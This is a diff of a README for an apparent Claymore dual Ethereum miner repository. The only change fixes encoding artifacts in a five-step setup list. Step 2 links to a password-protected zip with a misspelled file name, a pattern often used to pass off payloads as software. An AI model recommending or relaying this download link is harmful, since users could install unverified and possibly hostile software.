@@ -78,11 +78,11 @@ So, thank you so much for joining us!
   
 ## How to use
 
-<li>Step 1 â€“ Install your GPUs and set up your computer</li>
-<li>Step 2 â€“ <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
-<li>Step 3 â€“ Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
-<li>Step 4 â€“ Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
-<li>Step 5 â€“ Start mining!</li>
+<li>Step 1 - Install your GPUs and set up your computer</li>
+<li>Step 2 - <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
+<li>Step 3 - Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
+<li>Step 4 - Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
+<li>Step 5 - Start mining!</li>
 
 ## Example
 
